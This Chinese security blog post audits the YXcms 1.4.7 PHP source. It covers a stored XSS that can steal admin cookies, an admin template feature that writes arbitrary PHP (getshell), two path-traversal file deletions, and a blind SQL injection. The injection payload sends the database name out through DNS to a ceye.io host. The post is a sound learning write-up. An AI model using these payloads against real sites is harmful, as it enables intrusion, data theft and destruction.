# 代码审计——YXCMS

阅读量 **929736**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2020-05-12 14:30:45

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p2.ssl.qhimg.com/t01d856b0f7757920b2.png)

## 前言

YXcms是一个代码审计入门级的cms,比较适合想我这样的小白玩家进行操作。。。

我一直想尝试审计一个cms，但是因为各种原因，一直搁置了。

尝试分析一下`YXCMS`。。。

## 相关环境

源码信息 : Yxcms php建站系统 1.4.7  
本地环境 : phpstudy2018  
下载地址 :
[175.6.244.211:88/uploads/userup/1596/YXcmsApp1.4.7.zip](88/uploads/userup/1596/YXcmsApp1.4.7.zip)

## 安装环境

具体的安装和使用的详细可以上官网查看<https://www.kancloud.cn/yongheng/yxcms>

## YXcms代码审计

###  YXcms目录结构

[](https://imgchr.com/i/YPS7h8)

YXcms目录结构 |  
---|---  
data | 存放备份数据  
protected | 网站程序核心文件夹  
public | 存放css、images、js、swf等模板公用文件  
upload | 存放上传文件  
.htaccess | apache伪静态规则文件  
httpd.ini | iis伪静态规则文件  
index.php | 网站入口  
robots.txt | robots协议  
升级日志.txt | 详细升级日志记录文件  
protected文件夹一些重要的路径： |  
---|---  
protected/base | 控制器、模型以及接口的父类  
protected/cache | 数据库缓存、模板缓存等  
protected/include | canphp核心  
protected/config.php | 系统全局配置  
protected/core.php | 系统核心函数  
protected/apps | 存放应用  
protected/apps/admin | 后台  
protected/apps/default | 前台  
protected/apps/member | 会员中心  
protected/apps/install | 系统安装  
  
YXcms1.4.7是mvc路由模式开发的。。。  
这个版本后台有好几个严重漏洞，  
前台有一个储存型XSS，要利用也需与管理员交互。

我们一个一个来进行分析。。。

## 前台存储型XSS

###  漏洞复现

前台有留言板的功能，进行测试：

![](https://s1.ax1x.com/2020/05/04/YPUuIs.png)

当管理员在后台查看留言的时候，就能触发xss：

![](https://s1.ax1x.com/2020/05/04/YPUJLF.png)

可以通过这个`xss`来获取管理员的`cookie`，从而进入网站后台。。

###  代码分析

让我们看一下代码的实现：  
首先前台留言板的代码：

前台的文件源码`protected/apps/default/controller/columnController.php`

    
    
    public function index()
        {
            $ename=in($_GET['col']);
            if(empty($ename)) throw new Exception('栏目名不能为空~', 404);
            $sortinfo=model('sort')->find("ename='{$ename}'",'id,name,ename,path,url,type,deep,method,tplist,keywords,description,extendid');
            $path=$sortinfo['path'].','.$sortinfo['id'];
            $deep=$sortinfo['deep']+1;
            $this->col=$ename;
            switch ($sortinfo['type']) {
                case 1://文章
                    $this->newslist($sortinfo,$path,$deep);
                    break;
                case 2://图集
                    $this->photolist($sortinfo,$path,$deep);
                    break;
                case 3://单页
                    $this->page($sortinfo,$path,$deep);
                    break;
                case 4://应用
    
                    break;
                case 5://自定义
    
                    break;
                case 6://表单
                    $this->extend($sortinfo,$path,$deep);
                    break;
                default:
                    throw new Exception('未知的栏目类型~', 404);
                    break;
            }
        }
    
    ...
    protected function extend($sortinfo,$path,$deep)
        {
            $tableid=$sortinfo['extendid'];
            if(empty($tableid)) $this->error('表单栏目不存在~');
            $tableinfo = model('extend')->select("id='{$tableid}' OR pid='{$tableid}'",'id,tableinfo,name,type,defvalue','pid,norder DESC');
            if(empty($tableinfo)) $this->error('自定义表不存在~');
            $urls=explode('|', $sortinfo['url']);
            // var_dump($tableinfo);
            // var_dump($urls);
            // exit();
            if (!$this->isPost()) {
               ...
            }else{
               session_starts();
               $verify=session('verify');
               session('verify',null);
               if(empty($verify) || $_POST['checkcode']!=$verify) $this->error('验证码错误，请重新输入');
               for($i=1;$i<count($tableinfo);$i++){
                if(is_array($_POST[$tableinfo[$i]['tableinfo']])){
                   $data[$tableinfo[$i]['tableinfo']]=in(deletehtml(implode(',',$_POST[$tableinfo[$i]['tableinfo']])));
                   $data[$tableinfo[$i]['tableinfo']]=$data[$tableinfo[$i]['tableinfo']]?in(deletehtml($data[$tableinfo[$i]['tableinfo']])):'';
                }else{
                    if(strlen($_POST[$tableinfo[$i]['tableinfo']])>65535) $this->error('提交内容超过限制长度~');
                    $data[$tableinfo[$i]['tableinfo']]=html_in($_POST[$tableinfo[$i]['tableinfo']],true);
                }
               }
               $data['ip']=get_client_ip();
               $data['ispass']=0;
               $data['addtime']=time();
               if(empty($urls[1])) $jump=$_SERVER['HTTP_REFERER'];
               else{
                  $jurl=explode(',',$urls[1]);
                  if(!empty($jurl[1])){
                    $arr=explode('/',$jurl[1]);
                    if(!empty($arr)){
                      $canshu=array();
                      foreach ($arr as $vo) {
                         $val=explode('=',$vo);
                         $canshu[$val[0]]=$val[1];
                      }
                    }
                  }
                  $jump=url($jurl[0],$canshu); 
               }
               $mes=$urls[2]?$urls[2]:'提交成功请等待审核~';
               if(model('extend')->Extin($tableinfo[0]['tableinfo'],$data)) $this->success($mes,$jump);
               else $this->error('提交失败~');
             }
        }
    

这里前端对xss过滤不完善。。  
只对`tname`参数进行了验证`deletehtml`和`html_in`

`deletehtml`函数  
`/protected/include/lib/common.function.php`

    
    
    //去除html js标签
    function deletehtml($document) {
        $document = trim($document);
        if (strlen($document) <= 0)
        {
          return $document;
        }
        $search = array ("'<script[^>]*?>.*?</script>'si",  // 去掉 javascript
                      "'<[/!]*?[^<>]*?>'si",          // 去掉 HTML 标记
                      "'([rn])[s]+'",                // 去掉空白字符
                      "'&(quot|#34);'i",                // 替换 HTML 实体
                      "'&(amp|#38);'i",
                      "'&(lt|#60);'i",
                      "'&(gt|#62);'i",
                      "'&(nbsp|#160);'i"
                      );                    // 作为 PHP 代码运行
         $replace = array ("",
                       "",
                       "\1",
                       """,
                       "&",
                       "<",
                       ">",
                       " "
                       );
        return @preg_replace ($search, $replace, $document);
    }
    

`html_in`函数 对html代码进行xss识别，看是否存在危险的html标签对，并进行过滤  
使用htmlspecialchars() 函数把预定义的字符转换为 HTML 实体。：

`/protected/include/lib/common.function.php`

    
    
    //html代码输入
    function html_in($str,$filter=false){
        if($filter){
            $str=RemoveXSS($str);
        }
    
        $str=htmlspecialchars($str);
        if(!get_magic_quotes_gpc()) {
            $str = addslashes($str);
        }
       return $str;
    }
    

`RemoveXSS`函数 对一些危险的标签对 进行了过滤，使其不能进行正常的xss功能，：

    
    
    function RemoveXSS($val) {  
       // remove all non-printable characters. CR(0a) and LF(0b) and TAB(9) are allowed  
       // this prevents some character re-spacing such as <javascript>  
       // note that you have to handle splits with n, r, and t later since they *are* allowed in some inputs  
       $val = preg_replace('/([x00-x08,x0b-x0c,x0e-x19])/', '', $val);  
    
       // straight replacements, the user should never need these since they're normal characters  
       // this prevents like <IMG SRC=@avascript:alert('XSS')>  
       $search = 'abcdefghijklmnopqrstuvwxyz'; 
       $search .= 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';  
       $search .= '1234567890!@#$%^&*()'; 
       $search .= '~`";:?+/={}[]-_|'\'; 
       for ($i = 0; $i < strlen($search); $i++) { 
          // ;? matches the ;, which is optional 
          // 0{0,7} matches any padded zeros, which are optional and go up to 8 chars 
    
          // @ @ search for the hex values 
          $val = preg_replace('/(&#[xX]0{0,8}'.dechex(ord($search[$i])).';?)/i', $search[$i], $val); // with a ; 
          // @ @ 0{0,7} matches '0' zero to seven times  
          $val = preg_replace('/(&#0{0,8}'.ord($search[$i]).';?)/', $search[$i], $val); // with a ; 
       } 
    
       // now the only remaining whitespace attacks are t, n, and r 
       $ra1 = Array('javascript', 'vbscript', 'expression', 'applet', 'meta', 'xml', 'blink', 'link', 'style', 'script', 'embed', 'object', 'iframe', 'frame', 'frameset', 'ilayer', 'layer', 'bgsound', 'title', 'base'); 
       $ra2 = Array('onabort', 'onactivate', 'onafterprint', 'onafterupdate', 'onbeforeactivate', 'onbeforecopy', 'onbeforecut', 'onbeforedeactivate', 'onbeforeeditfocus', 'onbeforepaste', 'onbeforeprint', 'onbeforeunload', 'onbeforeupdate', 'onblur', 'onbounce', 'oncellchange', 'onchange', 'onclick', 'oncontextmenu', 'oncontrolselect', 'oncopy', 'oncut', 'ondataavailable', 'ondatasetchanged', 'ondatasetcomplete', 'ondblclick', 'ondeactivate', 'ondrag', 'ondragend', 'ondragenter', 'ondragleave', 'ondragover', 'ondragstart', 'ondrop', 'onerror', 'onerrorupdate', 'onfilterchange', 'onfinish', 'onfocus', 'onfocusin', 'onfocusout', 'onhelp', 'onkeydown', 'onkeypress', 'onkeyup', 'onlayoutcomplete', 'onload', 'onlosecapture', 'onmousedown', 'onmouseenter', 'onmouseleave', 'onmousemove', 'onmouseout', 'onmouseover', 'onmouseup', 'onmousewheel', 'onmove', 'onmoveend', 'onmovestart', 'onpaste', 'onpropertychange', 'onreadystatechange', 'onreset', 'onresize', 'onresizeend', 'onresizestart', 'onrowenter', 'onrowexit', 'onrowsdelete', 'onrowsinserted', 'onscroll', 'onselect', 'onselectionchange', 'onselectstart', 'onstart', 'onstop', 'onsubmit', 'onunload'); 
       $ra = array_merge($ra1, $ra2); 
    
       $found = true; // keep replacing as long as the previous round replaced something 
       while ($found == true) { 
          $val_before = $val; 
          for ($i = 0; $i < sizeof($ra); $i++) { 
             $pattern = '/'; 
             for ($j = 0; $j < strlen($ra[$i]); $j++) { 
                if ($j > 0) { 
                   $pattern .= '(';  
                   $pattern .= '(&#[xX]0{0,8}([9ab]);)'; 
                   $pattern .= '|';  
                   $pattern .= '|(&#0{0,8}([9|10|13]);)'; 
                   $pattern .= ')*'; 
                } 
                $pattern .= $ra[$i][$j]; 
             } 
             $pattern .= '/i';  
             $replacement = substr($ra[$i], 0, 2).'<x>'.substr($ra[$i], 2); // add in <> to nerf the tag  
             $val = preg_replace($pattern, $replacement, $val); // filter out the hex tags  
             if ($val_before == $val) {  
                // no replacements were made, so exit the loop  
                $found = false;  
             }  
          }  
       }  
       return $val;  
    }
    

测试了一下，发现前端输入`<svg/onload=alert(1)>`在数据库中会被存储为`&lt;svg/on&lt;x&gt;load=alert(1)&gt;`

我们在来看看后端的代码：  
后台的文件源码`protected/apps/admin/controller/extendfieldController.php`

    
    
        public function mesedit()
        {
            $tableid=intval($_GET['tabid']);
            if(!$this->checkConPower('extend',$tableid)) $this->error('您没有权限管理此独立表内容~');
            $id=intval($_GET['id']);//信息id
            if(empty($tableid) || empty($id) ) $this->error('参数错误~');
            $tableinfo = model('extend')->select("id='{$tableid}' OR pid='{$tableid}'",'id,tableinfo,name,type,defvalue','pid,norder DESC');
            if(empty($tableinfo)) $this->error('自定义表不存在~');
            if (!$this->isPost()) {
               $info=model('extend')->Extfind($tableinfo[0]['tableinfo'],"id='{$id}'");
               // var_dump($info);
               // exit();
               $this->info=$info;
               $this->tableid=$tableid;
               $this->id=$id;
               $this->tableinfo=$tableinfo;
               $this->display();
            }else{
               for($i=1;$i<count($tableinfo);$i++){
                   if(is_array($_POST[$tableinfo[$i]['tableinfo']]))
                     $data[$tableinfo[$i]['tableinfo']]=implode(',',$_POST[$tableinfo[$i]['tableinfo']]);
                   else
                     $data[$tableinfo[$i]['tableinfo']]=html_in($_POST[$tableinfo[$i]['tableinfo']]);
               }
               if(model('extend')->Extup($tableinfo[0]['tableinfo'],"id='{$id}'",$data)) $this->success('修改成功~',url('extendfield/meslist',array('id'=>$tableid)));
               else $this->error('信息修改失败~');
             }
        }
    

直接从数据库中取值，然后就是正常的给页面返回值了：

实现代码：  
`/protected/apps/admin/view/extendfield_mesedit.php`

    
    
                  $cont.='';
                  for($i=1;$i<count($tableinfo);$i++){
                     $cont.= '<tr><td align="right">'.$tableinfo[$i]['name'].'：</td><td align="left">';
                     switch ($tableinfo[$i]['type']) {
                           case 1:
                           $cont.= '<input type="text" name="'.$tableinfo[$i]['tableinfo'].'" value="'.$info[$tableinfo[$i]['tableinfo']].'">';
                           break;
    
                        case 2:
                           $cont.= '<textarea name="'.$tableinfo[$i]['tableinfo'].'" style="width:300px !important; height:80px">'.$info[$tableinfo[$i]['tableinfo']].'</textarea>';
                           break;
    
                        case 3:
    
                           $cont.= '<textarea class="editori" name="'.$tableinfo[$i]['tableinfo'].'" style="width:100%;height:250px;visibility:hidden;">'.html_out($info[$tableinfo[$i]['tableinfo']]).'</textarea>';
                           break;
    
                        case 4:
                           $cont.= '<select name="'.$tableinfo[$i]['tableinfo'].'" >';    
                        $chooses=explode("rn",$tableinfo[$i]['defvalue']);
                        $flog=false;
                        foreach ($chooses as $vo) {
                            $vos=explode(",",$vo);
                            if($info[$tableinfo[$i]['tableinfo']]==$vos[0]) {
                                $flog=true;
                                $cont.='<option selected value="'.$vos[0].'">'.$vos[1].'</option>';
                            }else{
                                $cont.='<option value="'.$vos[0].'">'.$vos[1].'</option>';
                            }
                        }
                        if(!$flog) $cont.='<option selected value="">=没有选择=</option>';
                        $cont.= '</select>';
                           break;
    
                        case 5:
                           $cont.= '<input name="'.$tableinfo[$i]['tableinfo'].'" id="'.$tableinfo[$i]['tableinfo'].'" type="text"  value="'.$info[$tableinfo[$i]['tableinfo']].'" />';
                        $cont.= '<iframe scrolling="no"; frameborder="0" src="'.url("extendfield/file",array('inputName'=>$tableinfo[$i]['tableinfo'])).'" style="width:300px; height:30px;"></iframe>';
                           break;
    
                        case 6:
                        $chooses=explode("rn",$tableinfo[$i]['defvalue']);
                        foreach ($chooses as $vo) {
                            $vos=explode(",",$vo);
                            $nowval=array();
                            $nowval=explode(",",$info[$tableinfo[$i]['tableinfo']]);
                            $cont.= (in_array($vos[0],$nowval))?$vos[1].'<input checked type="checkbox" name="'.$tableinfo[$i]['tableinfo'].'[]" value="'.$vos[0].'" />':$vos[1].'<input type="checkbox" name="'.$tableinfo[$i]['tableinfo'].'[]" value="'.$vos[0].'" /><br>';
                        }
                           break;
                     }
                     $cont.= '</td></tr>';
                  }
                  echo $cont;
    

只有`case3` 使用了`html_out`函数，

这个`html_out`函数操作就很骚。。。  
在`html代码输出`利用`htmlspecialchars_decode`将特殊的 HTML
实体转换回普通字符。。那么上面的被实体化的又被转换了回来。。。就可能会有XSS漏洞。。。

`/protected/include/lib/common.function.php`

    
    
    //html代码输出
    function html_out($str){
        if(function_exists('htmlspecialchars_decode'))
            $str=htmlspecialchars_decode($str);
        else
            $str=html_entity_decode($str);
        $str = stripslashes($str);
        return $str;
    }
    

别的参数，都被html实体化了为：`&lt;svg/on&lt;x&gt;load=alert(2)&gt;`
，只有留言内容用了`html_out`函数，被转换了回来。。  
被转换为了`<svg/on<x>load=alert(4)>` 但是存在`<x>`  
测试了一下竟然成功xss：

![](https://s1.ax1x.com/2020/05/05/YPxLfU.png)

是因为这个富文本编译器的原因导致的`xss`导致了`<x>`被吞，只剩下`<svg/onload=alert(4)>`执行了xss代码。(这里有点不是很清晰，找文章也没找到一个合理的解释，如果有大佬知道原理，请告诉我一下)

可以利用这个漏洞来获取管理员的`cookie`，进入后台。。。

## 任意文件写入(getshell)

###  漏洞复现

进入网站后台。  
`/index.php?r=admin/set/tpadd&Mname=default`  
新建模板文件：

![](https://s1.ax1x.com/2020/05/05/YiVDXV.png)

可以创建任意的文件。。  
通过目录结构，可以找到新的模板文件的位置`/protected/apps/default/view/default/phpinfo.php`

![](https://s1.ax1x.com/2020/05/05/YiZPAg.png)

可以看到是我们写入的文件被执行了，所有可以写入一句话木马，来进行`getshell`。。

###  代码分析

代码位置`protected/apps/admin/controller/setController.php`：

    
    
        public function tpadd()
        {
           $tpfile=$_GET['Mname'];
           if(empty($tpfile)) $this->error('非法操作~');
           $templepath=BASE_PATH . $this->tpath.$tpfile.'/';
           if($this->isPost()){
                $filename=trim($_POST['filename']);
                $code=stripcslashes($_POST['code']);
                if(empty($filename)||empty($code)) $this->error('文件名和内容不能为空');
             $filepath=$templepath.$filename.'.php';
             if($this->ifillegal($filepath)) {$this->error('非法的文件路径~');exit;}
             try{
                file_put_contents($filepath, $code);
              } catch(Exception $e) {
                $this->error('模板文件创建失败！');
              }    
              $this->success('模板文件创建成功！',url('set/tplist',array('Mname'=>$tpfile)));
           }else{
                $this->tpfile=$tpfile;
                $this->display();
    
           }
        }
    

这里`$_GET['Mname']`是新增模板文件的模板名字。。如果没有就会`error('非法操作~')`;  
新增模板的文件名和文件内容 是通过`post`进行传输的。

这里的文件保存路径就是`$templepath=protected/apps/default/view/default/`

然后对文件名和文件内容进行了非空验证`if(empty($filename)||empty($code))
$this->error('文件名和内容不能为空');` 别的没有验证。。。

验证了一下文件的路径：`if($this->ifillegal($filepath)) {$this->error('非法的文件路径~');exit;}`  
追踪这个函数`ifillegal`:  
代码位置`/protected/apps/admin/controller/setController.php`

    
    
        protected  function ifillegal($path)
        {
           if(strstr($path,"./")||strstr($path,".\")||!strstr($path,"/view/")) return true;
           else return false;
        }
    

也没有什么问题，然后就可以创建模板文件了。。

看完代码发现对文件内容没有任何的要求，直接`getshell`,这种管理员直接可以创建可执行文件的行为是很危险的。。。

## 任意文件删除(一)

###  漏洞复现

这个漏洞还是在后台。。。  
看到了这里有一个删除的按钮

![](https://s1.ax1x.com/2020/05/05/Yiuxw6.png)

点击删除，进行抓包：

通过控制`fname`参数可以实现任意文件删除的功能。。

![](https://s1.ax1x.com/2020/05/05/YiKk6A.png)

###  代码分析

代码位置`protected/apps/admin/controller/filesController.php`：

    
    
        public function del()
        {
           $dirs=in($_GET['fname']);
           $dirs=str_replace(',','/',$dirs);
           $dirs=ROOT_PATH.'upload'.$dirs;
           if(is_dir($dirs)){del_dir($dirs); echo 1;} 
           elseif(file_exists($dirs)){
                if(unlink($dirs)) echo 1;
           }else echo '文件不存在'; 
        }
    

对`fname`进行替换操作`str_replace(',','/',$dirs);`  
讲参数最前面的分号(%2C)替换为`/`

然后完整的拼接路径，看文件是否存在，存在就进行删除。。。  
这里没有读传入的参数进行过滤，  
可以及逆行上跳目录，从而达到任意文件删除的效果。。。

## 任意文件删除(二)

###  漏洞复现

漏洞位置一如既往的还在后台：

在对文章编辑的页面上，发现存在删除已上传的图片的功能。。

![](https://s1.ax1x.com/2020/05/05/YiMl4O.png)

设置抓包，点击删除：

![](https://s1.ax1x.com/2020/05/05/YiQ8oV.png)

虽然显示的是缩略图不存在，但是通过查看发现已经删除了123.txt这个文件

也是存在任意文件删除

###  代码分析

代码位置`/protected/apps/admin/controller/photoController.php`

    
    
        public function delpic()
        {
            if(empty($_POST['picname'])) $this->error('参数错误~');
            $picname=$_POST['picname'];
            $path=$this->uploadpath;
            if(file_exists($path.$picname))
              @unlink($path.$picname);
            else{echo '图片不存在~';return;} 
            if(file_exists($path.'thumb_'.$picname))
               @unlink($path.'thumb_'.$picname);
            else {echo '缩略图不存在~';return;}
            echo '原图以及缩略图删除成功~';
        }
    

这个代码和上面的那个任意文件删除，差不多，都是对参数的过滤不严谨，导致可以上跳目录，删除任意文件。。。

## SQL注入

###  漏洞复现

url:`/index.php?r=admin/fragment/index`

![](https://s1.ax1x.com/2020/05/05/Yi63i8.png)

利用[ceye](http://ceye.io/)得到的回显。。。  
用bp抓包，修改id为 payload:`2 and if((select load_file(concat('\\',(select
database()),'.36rdia.ceye.io\abc'))),2,2)`

![](https://s1.ax1x.com/2020/05/05/Yi6qOA.png)

在ceye上面可以得到回显：

![](https://s1.ax1x.com/2020/05/05/YicZkV.png)

得到了数据库名称`yxcms`

###  代码分析

代码位置`protected/apps/admin/controller/fragmentController.php`

    
    
        public function del()
        {
            if(!$this->isPost()){
                $id=intval($_GET['id']);
                if(empty($id)) $this->error('您没有选择~');
                if(model('fragment')->delete("id='$id'"))
                echo 1;
                else echo '删除失败~';
            }else{
                if(empty($_POST['delid'])) $this->error('您没有选择~');
                $delid=implode(',',$_POST['delid']);
                if(model('fragment')->delete('id in ('.$delid.')'))
                $this->success('删除成功',url('fragment/index'));
            }
        }
    

主要就是这一句话`if(model('fragment')->delete('id in ('.$delid.')'))`

追踪一下这个`delete`函数

先找一下这个`fragmentModel`  
代码位置：`protected/apps/admin/model/fragmentModel.php`

    
    
    <?php
    class fragmentModel extends baseModel{
        protected $table = 'fragment';
    }
    

发现没有任何东西，去这个`baseModel`里面找一下

代码位置：`protected/base/model/baseModel.php`

    
    
    <?php
    class baseModel extends model{
         protected $prefix='';
         public function __construct( $database= 'DB',$force = false ){
            parent::__construct();
            $this->prefix=config('DB_PREFIX');
        }
    }
    

看一下这个`model`

代码位置：`protected/base/model/model.php`

    
    
        public function delete($condition){
            return $this->model->table($this->table, $this->ignoreTablePrefix)->where($condition)->delete();
        }
    

这里又有一个`delete()`，这个应该还要找一下：

位置：`protected/include/core/cpModel.class.php`,

    
    
        public function delete() {
            $table = $this->options['table'];    //当前表
            $where = $this->_parseCondition();    //条件
            if ( empty($where) ) return false; //删除条件为空时，则返回false，避免数据不小心被全部删除
    
            $this->sql = "DELETE FROM $table $where";
            $query = $this->db->execute($this->sql);
            return $this->db->affectedRows();
        }
    

这里也是为sql语句赋值，然后拼接sql语句的作用。。

获取一下sql语句为`DELETE FROM yx_fragment WHERE id in (3)`。。。

需要关注这个代码：`$where = $this->_parseCondition(); //条件`

代码位置：`protected/include/core/cpModel.class.php`

    
    
        private function _parseCondition() {
            $condition = $this->db->parseCondition($this->options);
            $this->options['where'] = '';
            $this->options['group'] = '';
            $this->options['having'] = '';
            $this->options['order'] = '';
            $this->options['limit'] = '';
            $this->options['field'] = '*';        
            return $condition;        
        }
    

这里`$condition = $this->db->parseCondition($this->options);`

看一下`parseCondition`这个函数：

位置`protected/include/core/db/cpMysql.class.php`

    
    
        public function parseCondition($options) {
            $condition = "";
            if(!empty($options['where'])) {
                $condition = " WHERE ";
                if(is_string($options['where'])) {
                    $condition .= $options['where'];
                } else if(is_array($options['where'])) {
                        foreach($options['where'] as $key => $value) {
                             $condition .= " `$key` = " . $this->escape($value) . " AND ";
                        }
                        $condition = substr($condition, 0,-4);    
                } else {
                    $condition = "";
                }
            }
    
            if( !empty($options['group']) && is_string($options['group']) ) {
                $condition .= " GROUP BY " . $options['group'];
            }
            if( !empty($options['having']) && is_string($options['having']) ) {
                $condition .= " HAVING " .  $options['having'];
            }
            if( !empty($options['order']) && is_string($options['order']) ) {
                $condition .= " ORDER BY " .  $options['order'];
            }
            if( !empty($options['limit']) && (is_string($options['limit']) || is_numeric($options['limit'])) ) {
                $condition .= " LIMIT " .  $options['limit'];
            }
            if( empty($condition) ) return "";
            return $condition;
        }
    

大部分代码都是为变量赋值的，  
里面有一句代码`escape($value)` 应该是一个过滤函数

查看一下这个函数`escape`

    
    
        //数据过滤
        public function escape($value) {
            if( isset($this->_readLink) ) {
                $link = $this->_readLink;
            } elseif( isset($this->_writeLink) ) {
                $link = $this->_writeLink;
            } else {
                $link = $this->_getReadLink();
            }
    
            if( is_array($value) ) { 
               return array_map(array($this, 'escape'), $value);
            } else {
               if( get_magic_quotes_gpc() ) {
                   $value = stripslashes($value);
               } 
                return    "'" . mysql_real_escape_string($value, $link) . "'";
            }
        }
    

发现只有当我们传入的值为数组的时候，会对数组中的每个参数进行`mysql_real_escape_string()`函数进行处理。

sql语句为`DELETE FROM yx_fragment WHERE id in ($id)`

由于注入语句并没有单引号包裹，所以说可以直接进行注入，

但是没有页面的回显，可以利用`ceye`平台进行注入，在那里可以看到注入的回显。进行sql注入。

## 总结

第一次审计一个cms，虽然这是一个入门级的cms，比较简单，但是也从中学到了点知识。。。

审计代码要有耐心。。。找函数的时候直接用`Seay源码审计系统`中的全局搜索比较方便，自己乱找的话，心态会崩。。。

## 参考

<https://www.secshi.com/18986.html>  
[ceye](http://ceye.io/)  
<https://xz.aliyun.com/t/2734#toc-0>

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **p1ump** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/204398](/post/id/204398)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [代码审计](/tag/代码审计)

 **+1** __4赞

 __收藏

![](https://p2.ssl.qhimg.com/t01bf320cf8ea4eab09.png) p1ump

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

